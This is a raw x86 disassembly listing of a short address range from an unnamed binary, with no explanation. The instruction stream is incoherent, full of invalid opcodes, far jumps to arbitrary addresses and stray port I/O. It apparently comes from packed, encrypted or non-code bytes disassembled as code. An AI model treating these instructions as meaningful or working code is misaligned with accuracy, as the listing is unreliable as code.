  407894:	jle    0x407823
  407896:	(bad)  
  407897:	addr16 imul esp,esi,0x12
  40789b:	mov    ds:0x7fd80b4c,al
  4078a0:	xor    al,bh
  4078a2:	(bad)  
  4078a3:	leave  
  4078a4:	xor    DWORD PTR [esi-0x3afcc18b],0x9012da5
  4078ae:	nop
  4078af:	or     al,0xdd
  4078b1:	push   ecx
  4078b2:	loopne 0x407917
  4078b4:	ja     0x4078dc
  4078b6:	stc    
  4078b7:	lds    esp,FWORD PTR [eax]
  4078b9:	xchg   DWORD PTR [edx+0x63],edi
  4078bc:	scas   al,BYTE PTR es:[edi]
  4078bd:	adc    DWORD PTR [esi-0x4140fb45],ecx
  4078c3:	aas    
  4078c4:	clc    
  4078c5:	or     BYTE PTR [edi+0x66],dl
  4078c8:	popf   
  4078c9:	mov    ch,bl
  4078cb:	call   0xf55bf9bb
  4078d0:	push   edx
  4078d1:	aad    0xc7
  4078d3:	inc    edx
  4078d4:	mov    eax,ds:0x22f0bc07
  4078d9:	jmp    FWORD PTR [ebp-0x7ba83c9]
  4078df:	mov    esp,0x1e377eb4
  4078e4:	push   0x598fdc22
  4078e9:	jnp    0x4078ba
  4078eb:	mov    ds:0xf8f0eb58,eax
  4078f0:	cs jnp 0x4078c9
  4078f3:	adc    ebx,esi
  4078f5:	sahf   
  4078f6:	bound  ebx,QWORD PTR [ebx-0x19e79743]
  4078fc:	mov    BYTE PTR [esi+0x55fbe710],dl
  407902:	fsub   DWORD PTR [edx-0x51df451b]
  407908:	nop
  407909:	jle    0x40790c
  40790b:	pop    ecx
  40790c:	imul   eax,DWORD PTR [eax],0x8a563759
  407912:	push   edx
  407913:	call   0xaff9:0xa6986d59
  40791a:	adc    DWORD PTR [edi+0x4c],ecx
  40791d:	cmc    
  40791e:	bound  esi,QWORD PTR [ebx+ebp*4]
  407921:	ret    
  407922:	or     DWORD PTR [eax],edx
  407924:	add    eax,0xe28832dc
  407929:	dec    ebp
  40792a:	idiv   BYTE PTR [ebx+eiz*1-0x212b37d4]
  407931:	adc    BYTE PTR [edi],0xad
  407934:	jno    0x4078f2
  407936:	xor    eax,0xb13f584
  40793b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40793c:	cmp    al,0xc2
  40793e:	lea    edi,[edi+0x2d73aafc]
  407944:	mov    edi,DWORD PTR [edi+ebx*2]
  407947:	dec    edx
  407948:	outs   dx,BYTE PTR ds:[esi]
  407949:	cmc    
  40794a:	call   0xc950d034
  40794f:	xchg   DWORD PTR [ecx+0x67ff1d4e],ecx
  407955:	sbb    ecx,DWORD PTR [eax-0x4]
  407958:	ins    DWORD PTR es:[edi],dx
  407959:	int    0x83
  40795b:	sub    DWORD PTR [ebp-0x44da30f6],eax
  407961:	ror    BYTE PTR [ebp-0x34],cl
  407964:	add    esp,DWORD PTR [ecx-0x66a7a595]
  40796a:	aad    0x5d
  40796c:	fldcw  WORD PTR ds:[edi]
  40796f:	sahf   
  407970:	pop    ecx
  407971:	pusha  
  407972:	fisttp QWORD PTR [esi]
  407974:	dec    ecx
  407975:	outs   dx,DWORD PTR ds:[esi]
  407976:	es push eax
  407978:	xor    bh,BYTE PTR [ebp+0x27]
  40797b:	iret   
  40797c:	pop    ss
  40797d:	inc    esp
  40797e:	jl     0x40793f
  407980:	cmp    eax,0xd916f836
  407985:	out    dx,eax
  407986:	push   0x44109c7
  40798b:	sub    eax,DWORD PTR [eax-0x2d]
  40798e:	sar    DWORD PTR [esi+0x1c],0x76
  407992:	sub    BYTE PTR [ebx+0x1f],0x6
  407996:	xchg   ebp,eax
  407997:	pop    esi
  407998:	or     DWORD PTR [ecx-0x3],edx
  40799b:	inc    esi
  40799c:	push   edx
  40799d:	fcomp  QWORD PTR [ebp-0x72]
  4079a0:	outs   dx,BYTE PTR ds:[esi]
  4079a1:	iret   
  4079a2:	das    
  4079a3:	fist   DWORD PTR [ecx+0x38]
  4079a6:	sbb    eax,DWORD PTR [edx+0xae2a202]
  4079ac:	sbb    esi,edi
  4079ae:	sbb    DWORD PTR [ecx+0xb],0x1b
  4079b2:	jmp    0x407a1b
  4079b4:	jmp    0x4079d9
  4079b6:	jmp    0xb69a94f6
  4079bb:	xor    eax,0x1faa81c6
  4079c0:	cmp    bh,cl
  4079c2:	or     eax,0x8c9f3585
  4079c7:	(bad)
  4079cb:	mov    al,BYTE PTR [edi]
  4079cd:	stc    
  4079ce:	pop    ebp
  4079cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079d0:	lock cwde 
  4079d2:	sub    eax,0xdf4b7f1e
  4079d7:	xchg   esi,eax
  4079d8:	xchg   DWORD PTR [ecx],edx
  4079da:	jg     0x407a23
  4079dc:	stc    
  4079dd:	mov    ?,WORD PTR [ebx+0x6a89349f]
  4079e3:	xor    dh,bh
  4079e5:	and    BYTE PTR [edi-0x4d],al
  4079e8:	mov    bl,0x3f
  4079ea:	xchg   DWORD PTR [ebp-0x1a8deff],ebx
  4079f0:	push   ecx
  4079f1:	xchg   edx,eax
  4079f2:	adc    al,dl
  4079f4:	dec    esi
  4079f5:	jno    0x4079e3
  4079f7:	bound  eax,QWORD PTR [ebp+0x6f498718]
  4079fd:	xchg   edi,eax
  4079fe:	jno    0x4079c1
  407a00:	jmp    0x4079fd
  407a02:	jmp    0x4079ea
  407a04:	dec    esi
  407a05:	ret    
  407a06:	(bad)  
  407a08:	out    0x3e,al
  407a0a:	test   al,0x5b
  407a0c:	ins    DWORD PTR es:[edi],dx
  407a0d:	xor    DWORD PTR [ecx-0x3e0244db],esp
  407a13:	out    0xd6,al
  407a15:	aaa    
  407a16:	retf   0xe56a
  407a19:	fnsave ss:[ebp+0x62]
  407a1d:	fild   QWORD PTR [eax]
  407a1f:	xchg   ebp,eax
  407a20:	xchg   ebx,eax
  407a21:	out    0x27,eax
  407a23:	xchg   DWORD PTR [esi],edi
  407a25:	and    dl,dh
  407a27:	fmul   st(2),st
  407a29:	fadd   QWORD PTR [ebx-0x36]
  407a2c:	test   BYTE PTR [ecx-0x5d63f2a3],bh
  407a32:	push   cs
  407a33:	jle    0x407a0c
  407a35:	int3   
  407a36:	and    BYTE PTR [edi],0x91
  407a39:	stos   DWORD PTR es:[edi],eax
  407a3a:	imul   ebx,DWORD PTR [edi+ebx*4-0x4d112393],0x7d3252bf
  407a45:	pop    ebp
  407a46:	lock outs dx,BYTE PTR ds:[esi]
  407a48:	dec    esp
  407a49:	push   esp
  407a4a:	dec    edi
  407a4b:	push   ebp
  407a4c:	ds aam 0xa5
  407a4f:	mov    cl,0xa
  407a51:	inc    eax
  407a52:	sbb    eax,DWORD PTR [eax]
  407a54:	fdivr  QWORD PTR [ebx-0x12]
  407a57:	xchg   esp,eax
  407a58:	inc    esi
  407a59:	aam    0x78
  407a5b:	loopne 0x407a6e
  407a5d:	(bad)  
  407a5f:	jge    0x4079eb
  407a61:	imul   ebx,edi,0xadcf13e6
  407a67:	jo     0x407ac5
  407a69:	pusha  
  407a6a:	ret    
  407a6b:	(bad)  
  407a6c:	pop    ebx
  407a6d:	mov    eax,0xc6253916
  407a72:	fst    DWORD PTR [ecx+0x58c93d62]
  407a78:	aad    0x94
  407a7a:	pop    edx
  407a7b:	dec    ebp
  407a7c:	and    al,0x19
  407a7e:	addr16 jle 0x407a21
  407a81:	pop    edi
  407a82:	sbb    esi,DWORD PTR [eax+0x7c]
  407a85:	loop   0x407a58
  407a87:	push   edi
  407a88:	inc    esp
  407a89:	inc    ebp
  407a8a:	mov    bh,0x8a
  407a8c:	sahf   
  407a8d:	jmp    0x244f961d
  407a92:	adc    DWORD PTR [esi+ebx*1-0x73da8af1],ebp
  407a99:	inc    eax
  407a9a:	hlt    
  407a9b:	inc    ebp
  407a9c:	jno    0x407a2a
  407a9e:	aaa    
  407a9f:	or     edx,edi
  407aa1:	and    ebp,edx
  407aa3:	bnd jns 0x407b05
  407aa6:	sbb    bl,dh
  407aa8:	pop    edx
  407aa9:	stos   BYTE PTR es:[edi],al
  407aaa:	div    BYTE PTR [ecx+eax*1+0x37]
  407aae:	jle    0x407abf
  407ab0:	mov    edi,DWORD PTR [esi]
  407ab2:	sbb    ebp,ecx
  407ab4:	mov    cl,0xb4
  407ab6:	mov    ebx,0x3ad4c55f
  407abb:	les    eax,FWORD PTR [edx+edx*1]
  407abe:	adc    DWORD PTR [edi+0x3215b380],edi
  407ac4:	jl     0x407a59
  407ac6:	test   al,0xa2
  407ac8:	or     edi,eax
  407aca:	clc    
  407acb:	dec    ecx
  407acc:	int3   
  407acd:	mov    al,ds:0xff75a652
  407ad2:	jns    0x407ae7
  407ad4:	sahf   
  407ad5:	mov    eax,ds:0x7e62ffb7
  407ada:	scas   eax,DWORD PTR es:[edi]
  407adb:	test   DWORD PTR [esi+esi*1+0xcaa5ace],0x6aa90e0a
  407ae6:	push   esi
  407ae7:	test   eax,0xbe4b767
  407aec:	and    ecx,esp
  407aee:	mov    bl,dh
  407af0:	xchg   ebp,eax
  407af1:	jp     0x407aec
  407af3:	cwde   
  407af4:	or     esi,DWORD PTR [ebx+0x30352b80]
  407afa:	out    dx,eax
  407afb:	hlt    
  407afc:	mov    esp,0xff63faab
  407b01:	add    BYTE PTR [ebx+0x29bd5b7a],al
  407b07:	inc    ebp
  407b08:	fsub   st(2),st
  407b0a:	pop    eax
  407b0b:	pop    ebp
  407b0c:	pop    edi
  407b0d:	xor    eax,0x9e8f8a09
  407b12:	fdivr  DWORD PTR [esi-0x7b43806a]
  407b18:	pop    ss
  407b19:	popa   
  407b1a:	sar    BYTE PTR [ebx],1
  407b1c:	mov    eax,0x67eb4096
  407b21:	or     eax,0x9c693bf7
  407b26:	mov    edi,0x798a4a28
  407b2b:	adc    DWORD PTR [ebx+0x2],0xe
  407b2f:	mov    bl,0xcb
  407b31:	xor    DWORD PTR [eax+esi*1],edx
  407b34:	enter  0xc694,0xd9
  407b38:	sbb    eax,0x483fc8e8
  407b3d:	xchg   edx,eax
  407b3e:	ins    DWORD PTR es:[edi],dx
  407b3f:	inc    edi
  407b40:	sbb    dl,BYTE PTR [edx]
  407b42:	inc    eax
  407b43:	or     al,BYTE PTR [eax-0x17]
  407b46:	in     eax,dx
  407b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b48:	inc    edx
  407b49:	leave  
  407b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b4b:	ds jmp 0x9ff1:0xcbbc3435
  407b53:	jbe    0x407b41
  407b55:	loope  0x407b7a
  407b57:	pop    esp
  407b58:	sub    eax,0xf6da3d3f
  407b5d:	lock (bad) 
  407b5f:	push   0xa1405701
  407b64:	les    edx,FWORD PTR [esi+0x3ec8441a]
  407b6a:	dec    esp
  407b6b:	xchg   DWORD PTR gs:[eax+0x7d],esi
  407b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b70:	neg    DWORD PTR [eax]
  407b72:	push   edx
  407b73:	stos   DWORD PTR es:[edi],eax
  407b74:	loopne 0x407b5b
  407b76:	(bad)  
  407b77:	mov    bl,0xea
  407b79:	push   ds
  407b7a:	pop    edi
  407b7b:	cdq    
  407b7c:	dec    esi
  407b7d:	bound  eax,QWORD PTR [edi-0x27083c06]
  407b83:	adc    edx,DWORD PTR [ebp-0x46]
  407b86:	dec    ebp
  407b87:	pop    ebx
  407b88:	and    BYTE PTR [ecx+0x1b479b64],al
  407b8e:	cmp    DWORD PTR ss:[eax+0x1c],0xd3662499
  407b96:	xor    BYTE PTR [ebx+eax*8+0x59b68ab2],0x6b
  407b9e:	jmp    0xdd123045
  407ba3:	rcl    BYTE PTR [eax+ecx*4],1
  407ba6:	push   0xffffff87
  407ba8:	pop    ecx
  407ba9:	mov    ds:0xc9b7a61d,eax
  407bae:	dec    eax
  407baf:	mov    ah,0xad
  407bb1:	fnstsw WORD PTR [ebp-0xc]
  407bb4:	jmp    0x407b83
  407bb6:	fst    DWORD PTR [eax+0x7b]
  407bb9:	lods   al,BYTE PTR ds:[esi]
  407bba:	cmp    edi,DWORD PTR [esi+0x18]
  407bbd:	ins    BYTE PTR es:[edi],dx
  407bbe:	loop   0x407b74
  407bc0:	push   esi
  407bc1:	jmp    0xf1c9136
  407bc6:	test   al,0x50
  407bc8:	dec    edx
  407bc9:	cs sbb ah,al
  407bcc:	mul    DWORD PTR [ebp-0xd]
  407bcf:	mov    WORD PTR [esp+ecx*8],?
  407bd2:	xchg   esi,eax
  407bd3:	in     eax,dx
  407bd4:	mov    ch,0x6f
  407bd6:	and    BYTE PTR [ecx+ecx*4],0x9a
  407bda:	rcr    BYTE PTR [esi+0xb],0xb6
  407bde:	enter  0x60e0,0x94
  407be2:	mov    ecx,0xc5d2fafb
  407be7:	xor    BYTE PTR [ecx-0x14],0x54
  407beb:	jns    0x407ba6
  407bed:	fld    TBYTE PTR [ebp-0x493c19f7]
  407bf3:	mov    WORD PTR [ecx-0x540bc51e],?
  407bf9:	sbb    eax,0xaf60ca55
  407bfe:	cmp    eax,0xc2c2f73
  407c03:	fwait
  407c04:	loope  0x407be7
  407c06:	les    esi,FWORD PTR [eax+edx*8-0x56]
  407c0a:	xchg   edx,eax
  407c0b:	push   edx
  407c0c:	mov    esi,0x608539b7
  407c11:	rcr    bl,1
  407c13:	sahf   
  407c14:	(bad)  
  407c15:	jb     0x407c89
  407c17:	jle    0x407c0c
  407c19:	mov    bh,bl
  407c1b:	je     0x407bd8
  407c1d:	repz (bad) [eax-0x70659e0d]
  407c24:	xchg   ecx,eax
  407c25:	mov    al,BYTE PTR [edi+0x6e3a26e4]
  407c2b:	int3   
  407c2c:	int3   
  407c2d:	pop    ebp
  407c2e:	lea    ecx,[esi-0x49]
  407c31:	int3   
  407c32:	pushf  
  407c33:	xchg   ebx,eax
  407c34:	pop    ebx
  407c35:	push   eax
  407c36:	add    ah,BYTE PTR [ebx]
  407c38:	xor    al,0xe1
  407c3a:	sar    DWORD PTR [esi+0x14],cl
  407c3d:	cmp    ch,bl
  407c3f:	mov    eax,0x6a31d7f8
  407c44:	adc    esp,0x5b
  407c47:	adc    esp,ebp
  407c49:	outs   dx,DWORD PTR ds:[esi]
  407c4a:	mov    cl,0x7c
  407c4c:	pusha  
  407c4d:	std    
  407c4e:	dec    edx
  407c4f:	pop    ss
  407c50:	mov    dl,0xc4
  407c52:	pop    ss
  407c53:	test   ebp,esi
  407c55:	call   0x58d75ef4
  407c5a:	mul    DWORD PTR [eax-0x79]
  407c5d:	xor    DWORD PTR [ebx+eax*2+0x31],ecx
  407c61:	xchg   BYTE PTR [ebp+0x68dd07a8],dl
  407c67:	inc    ecx
  407c68:	mov    ah,0x8
  407c6a:	push   ecx
  407c6b:	outs   dx,DWORD PTR ds:[esi]
  407c6c:	in     al,dx
  407c6d:	fidivr WORD PTR [esi+0x7f]
  407c70:	mov    ds:0x39313f42,eax
  407c75:	jns    0x407c60
  407c77:	imul   ebp,DWORD PTR [edi-0x47],0x6368932b
  407c7e:	mov    dl,0x18
  407c81:	and    cl,cl
  407c83:	arpl   di,si
  407c85:	mov    fs,WORD PTR [ecx-0x28c33a3]
  407c8b:	xchg   esp,eax
  407c8c:	inc    ebx
  407c8d:	mov    ds:0x9998440d,eax
  407c92:	(bad)  
  407c93:	retf   0x2316
  407c96:	and    al,0xe3
  407c98:	fdiv   DWORD PTR [edx]
  407c9a:	mov    eax,0xa13d4387
  407c9f:	cmp    BYTE PTR [edx+eax*4+0x7c9f19eb],ch
  407ca6:	mov    esi,0x961446a9
  407cab:	add    al,0x94
  407cad:	hlt    
  407cae:	push   eax
  407caf:	icebp  
  407cb0:	jg     0x407c74
  407cb2:	dec    edx
  407cb3:	push   ds
  407cb4:	in     eax,0x9b
  407cb6:	xor    edx,DWORD PTR [edi+0x1e]
  407cb9:	stc    
  407cba:	sub    esi,DWORD PTR [ebx-0x5c]
  407cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cbe:	fisttp WORD PTR [ecx]
  407cc0:	mov    ebx,0x375e5e40
  407cc5:	xchg   ecx,eax
  407cc6:	jne    0x407d14
  407cc8:	enter  0x84ce,0x38
  407ccc:	aaa    
  407ccd:	sbb    eax,DWORD PTR [esi]
  407ccf:	es repz push ss
  407cd2:	sbb    DWORD PTR [ebp-0x18b7874],edi
  407cd8:	test   BYTE PTR [edx+eiz*1],ch
  407cdb:	cmp    al,0x37
  407cdd:	inc    ebp
  407cde:	sbb    al,0x54
  407ce0:	mov    ebx,0xe6d2ac32
  407ce5:	lock cmp bl,BYTE PTR [edi+0x491dbec]
  407cec:	xchg   DWORD PTR [edx],esi
  407cee:	inc    ecx
  407cef:	push   ds
  407cf0:	ret    
  407cf1:	push   eax
  407cf2:	lea    ebp,[edx-0x52]
  407cf5:	xchg   esi,eax
  407cf6:	pop    ss
  407cf7:	jo     0x407d66
  407cf9:	jae    0x407cd7
  407cfb:	leave  
  407cfc:	cld    
  407cfd:	xchg   ecx,eax
  407cfe:	fcom   DWORD PTR [esi-0x2c]
  407d01:	lahf   
  407d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d04:	leave  
  407d05:	dec    edx
  407d06:	push   ds
  407d07:	or     eax,0x602fe3ab
  407d0c:	xchg   esp,eax
  407d0d:	cmp    eax,0xa72b20b3
  407d12:	cmp    ch,BYTE PTR [eax-0x7f546908]
  407d18:	adc    eax,0xe82ce24c
  407d1d:	ds xchg esi,eax
  407d1f:	push   ss
  407d20:	cld    
  407d21:	mov    ds:0x42da097,eax
  407d26:	ret    
  407d27:	arpl   WORD PTR [esi-0x6f60b7b2],bp
  407d2d:	cmp    al,0xea
  407d2f:	cmp    al,0x47
  407d31:	or     DWORD PTR [edx+0x35e16efc],0xffffffa2
  407d38:	int    0x4e
  407d3a:	(bad)  
  407d3b:	(bad)  
  407d3c:	ds inc ebp
  407d3e:	sbb    BYTE PTR [ecx-0x5ec56c0],ah
  407d44:	sbb    ah,BYTE PTR [ecx+0x30557d8f]
  407d4a:	push   ss
  407d4b:	fsub   DWORD PTR [edx-0x2e448b31]
  407d51:	hlt    
  407d52:	sbb    BYTE PTR [eax+0x1cf872e7],0xf5
  407d59:	push   esi
  407d5a:	mov    BYTE PTR [edi-0x33a519ad],bh
  407d60:	out    0x6c,eax
  407d62:	gs mov edx,0x9480fbce
  407d68:	xchg   DWORD PTR [eiz*4-0x64e7ae0c],ebx
  407d6f:	fild   WORD PTR [eax-0x2cd04133]
  407d75:	sub    DWORD PTR [ebx+ecx*2],edx
  407d78:	jb     0x407d8b
  407d7a:	pop    ebx
  407d7b:	retf   
  407d7c:	sbb    cl,0x37
  407d7f:	repnz mov bh,0x43
  407d82:	mov    dl,0xd9
  407d84:	jp     0x407d23
  407d86:	or     ah,BYTE PTR [ebx]
  407d88:	clc    
  407d89:	in     al,0xc7
  407d8b:	mov    ebp,0x881b4671
  407d90:	or     bh,bh
  407d92:	and    esi,DWORD PTR [edi+0x1e]
  407d95:	int3   
  407d96:	repnz test DWORD PTR [edx+0x6eb69c2d],ebx
  407d9d:	mov    si,0x61ac
  407da1:	test   eax,0x4cf3faa
  407da6:	shl    esi,1
  407da8:	fwait
  407da9:	pop    ss
  407daa:	(bad)  
  407dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dac:	out    0xe6,al
  407dae:	push   esp
  407daf:	fld    QWORD PTR [ebx-0x2063e8ae]
  407db5:	xchg   esi,eax
  407db6:	imul   ecx,DWORD PTR [eax],0xffffff91
  407db9:	in     al,dx
  407dba:	xor    al,0xf7
  407dbc:	push   esi
  407dbd:	mov    ebx,0x5754bfe1
  407dc2:	(bad)  
  407dc3:	cwde   
  407dc4:	push   esp
  407dc5:	add    BYTE PTR [edx],dh
  407dc7:	and    eax,0x40d950f9
  407dcc:	inc    edi
  407dcd:	mov    ah,0x17
  407dcf:	pop    eax
  407dd0:	pop    edi
  407dd1:	push   ebp
  407dd2:	jne    0x407d60
  407dd4:	nop
  407dd5:	adc    ch,BYTE PTR [ebp+0x7e20d221]
  407ddb:	or     esi,esp
  407ddd:	dec    edx
  407dde:	jnp    0x407df8
  407de0:	add    eax,0xb3714128
  407de5:	inc    ebx
  407de6:	in     eax,0xd4
  407de8:	and    ecx,DWORD PTR [esi-0x775da54b]
  407dee:	mov    cl,BYTE PTR [ecx]
  407df0:	dec    ecx
  407df1:	add    al,0x45
  407df3:	cld    
  407df4:	call   0xd8d5119b
  407df9:	add    al,0x25
  407dfb:	nop
  407dfc:	dec    al
  407dfe:	xchg   DWORD PTR [edi],esp
  407e00:	jae    0x407de8
  407e02:	(bad)  
  407e03:	hlt    
  407e04:	dec    edi
  407e05:	sar    dl,1
  407e07:	mov    cl,0x5f
  407e09:	sbb    ebx,edi
  407e0b:	pop    esp
  407e0c:	das    
  407e0d:	push   0x9601adfa
  407e12:	fsub   QWORD PTR [ecx-0x2342013e]
  407e18:	and    cl,bl
  407e1a:	mov    ebx,0xa5113086
  407e1f:	std    
  407e20:	js     0x407e9b
  407e22:	call   FWORD PTR [ebp-0xf9d9971]
  407e28:	(bad)  
  407e29:	repnz iret 
  407e2b:	mov    edi,0x1e391c6a
  407e30:	cmp    eax,0x8dee2e34
  407e35:	jb     0x407e10
  407e37:	outs   dx,BYTE PTR ds:[esi]
  407e38:	push   edx
  407e39:	out    dx,al
  407e3a:	jnp    0x407e6d
  407e3c:	es add cl,bl
  407e3f:	es popf 
  407e41:	push   0xffffffe0
  407e43:	fs jmp 0xa9c6e8d3
  407e49:	cmp    eax,0x53a550ed
  407e4e:	sbb    al,0x8b
  407e50:	or     esp,ebx
  407e52:	push   eax
  407e53:	sbb    BYTE PTR [ebp-0x7d6a8111],0x72
  407e5a:	dec    ebx
  407e5b:	push   eax
  407e5c:	loop   0x407ec8
  407e5e:	or     al,0xa4
  407e60:	push   edi
  407e61:	lods   eax,DWORD PTR ds:[esi]
  407e62:	push   cs
  407e63:	rcl    BYTE PTR [edx+edx*8-0x78],cl
  407e67:	sub    ah,0xd5
  407e6a:	pop    eax
  407e6b:	xchg   ecx,eax
  407e6c:	jmp    0x31cb:0x9cb766d8
  407e73:	dec    eax
  407e74:	mov    ds:0x60e82a1,eax
  407e79:	jns    0x407e99
  407e7b:	data16 sahf 
  407e7d:	inc    ebp
  407e7e:	pop    esi
  407e7f:	fwait
  407e80:	inc    esi
  407e81:	inc    BYTE PTR [ebp-0x32]
  407e84:	test   al,al
  407e86:	sbb    eax,0xfb27f318
  407e8b:	xor    BYTE PTR [edx],bh
  407e8d:	xor    al,0x91
  407e8f:	ss nop
  407e91:	in     al,0xff
  407e93:	and    DWORD PTR [edi],0x8e7de0e4
  407e99:	test   DWORD PTR [ebx+0x3bbdcda5],ecx
  407e9f:	mov    al,ds:0xdb0e7055
  407ea4:	(bad)  
  407ea5:	and    eax,0x3a63708f
  407eaa:	pmaddwd mm7,mm1
  407ead:	imul   ebp,edx,0xeccbc1df
  407eb3:	xor    ecx,DWORD PTR [ebx+esi*2]
  407eb6:	jecxz  0x407f01
  407eb8:	pop    di
  407eba:	jmp    DWORD PTR [ecx]
  407ebc:	nop
  407ebd:	sub    BYTE PTR [edi],al
  407ebf:	stos   BYTE PTR es:[edi],al
  407ec0:	mov    dh,0xa7
  407ec2:	add    cl,bl
  407ec4:	loope  0x407ea1
  407ec6:	into   
  407ec7:	sub    al,0x99
  407ec9:	stc    
  407eca:	aad    0x83
  407ecc:	push   edi
  407ecd:	jmp    0x3315:0x7ce1a9db
  407ed4:	data16 repnz mov ah,0x6a
  407ed8:	jmp    0xb7b63c56
  407edd:	ss xchg esi,eax
  407edf:	(bad)  
  407ee0:	in     al,dx
  407ee1:	xor    eax,0xb4bb98a6
  407ee6:	mov    ebp,0x18e993c0
  407eeb:	or     BYTE PTR [ebx],bl
  407eed:	mov    al,0x10
  407eef:	add    al,0xa5
  407ef1:	xchg   edi,eax
  407ef2:	test   bl,dl
  407ef4:	adc    al,0xa3
  407ef6:	(bad)  
  407ef7:	mov    edi,0x51f63905
  407efc:	clc    
  407efd:	cmp    DWORD PTR [edi],ebp
  407eff:	jl     0x407eef
  407f01:	xor    DWORD PTR [esi-0x4d],0x3f
  407f05:	pop    ecx
  407f06:	arpl   WORD PTR [ebx+ecx*1-0x7c86ffe5],di
  407f0d:	inc    esi
  407f0e:	(bad)  
  407f0f:	ror    DWORD PTR ds:0x4b44ea29,cl
  407f15:	fwait
  407f16:	cmc    
  407f17:	inc    esi
  407f18:	sub    esi,DWORD PTR [edi+0x41]
  407f1b:	jne    0x407edb
  407f1d:	mov    edx,0xdd7787d1
  407f22:	aaa    
  407f23:	int    0x71
  407f25:	lods   eax,DWORD PTR ds:[esi]
  407f26:	outs   dx,DWORD PTR ds:[si]
  407f28:	arpl   dx,ax
  407f2a:	dec    eax
  407f2b:	in     al,0xf6
  407f2d:	repz adc BYTE PTR [edx+0x21],0x75
  407f32:	mov    dh,0xe7
  407f34:	cmp    ch,BYTE PTR [eax+0x1b]
  407f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f38:	jle    0x407fab
  407f3a:	xor    DWORD PTR [edx],edi
  407f3c:	add    al,0x56
  407f3e:	imul   esi,DWORD PTR [eax+0x32],0x2b
  407f42:	(bad)
  407f46:	mov    ds:0x8f9a3df9,eax
  407f4b:	sbb    ecx,edi
  407f4d:	fs push ds
  407f4f:	call   0x75dd:0xde7d9e88
  407f56:	shl    BYTE PTR [esi+0x4a],1
  407f59:	cmp    al,0x74
  407f5b:	nop
  407f5c:	rcr    BYTE PTR [esi-0x75],1
  407f5f:	jge    0x407f0f
  407f61:	jp     0x407f0d
  407f63:	mov    edx,0xdde11d8d
  407f68:	lods   eax,DWORD PTR ds:[esi]
  407f69:	push   ds
  407f6a:	lock call 0x6a6a72b
  407f70:	jo     0x407f26
  407f72:	pop    esp
  407f73:	push   0x57e417af
  407f78:	add    dl,BYTE PTR [esi]
  407f7a:	push   edi
  407f7b:	je     0x407fc5
  407f7d:	and    al,0x57
  407f7f:	xlat   BYTE PTR ds:[ebx]
  407f80:	push   ds
  407f81:	pop    es
  407f82:	out    0x59,eax
  407f84:	push   ebx
  407f85:	retf   
  407f86:	ror    edx,1
  407f88:	jne    0x407fe5
  407f8a:	sbb    eax,0x9f69a61a
  407f8f:	aaa    
  407f90:	stc    
  407f91:	out    dx,al
  407f92:	or     eax,0x2597af79
  407f97:	into   
  407f98:	(bad)  
  407f99:	push   ss
  407f9a:	loope  0x407fc9
  407f9c:	dec    esp
  407f9d:	mov    ebp,0xf88d555
  407fa2:	fidivr WORD PTR [ebp-0x65]
  407fa5:	int3   
  407fa6:	pop    esi
  407fa7:	sbb    al,0xa0
  407fa9:	jmp    0x5f3:0x965d18af
  407fb0:	arpl   di,sp
  407fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb3:	mov    ebx,0x9f0e1b73
  407fb8:	push   eax
  407fb9:	fmul   QWORD PTR [edx+0x568424c9]
  407fbf:	dec    eax
  407fc0:	xchg   esp,eax
  407fc1:	sub    DWORD PTR [edi+0x7227f731],ebp
  407fc7:	lsl    edi,dx
  407fca:	lods   al,BYTE PTR ds:[esi]
  407fcb:	mov    bh,0x52
  407fcd:	arpl   WORD PTR [ebx-0x21],sp
  407fd0:	and    cl,BYTE PTR [edi]
  407fd2:	xlat   BYTE PTR ds:[ebx]
  407fd3:	jo     0x408017
  407fd5:	sar    BYTE PTR [ebx+0x2e],1
  407fd8:	mov    ds,WORD PTR [eax-0x4d]
  407fdb:	pop    ds
  407fdc:	std    
  407fdd:	xor    eax,0xdcada73e
  407fe2:	gs jnp 0x407f86
  407fe5:	dec    eax
  407fe6:	mov    al,BYTE PTR [edx]
  407fe8:	std    
  407fe9:	ss inc esi
  407feb:	dec    eax
  407fec:	push   esp
  407fed:	sub    eax,DWORD PTR [ebx-0x25]
  407ff0:	lds    ebx,FWORD PTR [ecx-0x47]
  407ff3:	pop    eax
  407ff4:	cli    
  407ff5:	in     eax,dx
  407ff6:	stc    
  407ff7:	in     eax,dx
  407ff8:	pusha  
  407ff9:	std    
  407ffa:	ficomp WORD PTR [esp+ecx*8+0x4ef98a16]
  408001:	and    dl,BYTE PTR [ebx+0x490a17d4]
  408007:	test   DWORD PTR ds:0x56e67939,ebp
  40800d:	mov    ds:0x54bfe303,al
  408012:	out    dx,eax
  408013:	mov    edi,0x8d9a2568
  408018:	mov    DWORD PTR [ebx+eiz*8+0xc],edi
  40801c:	cmp    DWORD PTR [esi+0x4],eax
  40801f:	test   al,0xb9
  408021:	sub    edi,DWORD PTR [ebp-0x1fda8abe]
  408027:	pushf  
  408028:	sub    ebx,ecx
  40802a:	arpl   ax,bx
  40802c:	pop    esi
  40802d:	pushf  
  40802e:	ret    
  40802f:	test   al,0x6b
  408031:	aaa    
  408032:	sub    eax,0x986f7bf6
  408037:	dec    ebp
  408038:	sub    DWORD PTR [ebx+0x1d],ebx
  40803b:	xchg   esi,eax
  40803c:	or     eax,0x75c697cd
  408041:	shl    DWORD PTR [bx+di+0x18cd],1
  408046:	rep ins BYTE PTR es:[edi],dx
  408048:	in     al,dx
  408049:	mov    ds:0x3961d5d8,eax
  40804e:	ss cwde 
  408050:	mov    ah,0x9c
  408052:	lods   al,BYTE PTR ds:[esi]
  408053:	sbb    eax,0x9e0294be
  408058:	pop    ebx
  408059:	push   edi
  40805a:	loope  0x40808f
  40805c:	shl    BYTE PTR [esp+ebx*2+0x3ca73b99],0xe7
  408064:	(bad)  
  408065:	clc    
  408066:	loope  0x4080dc
  408068:	jmp    0xbe9f:0x38c75b27
  40806f:	(bad)  
  408070:	cmp    bh,al
  408072:	pop    edi
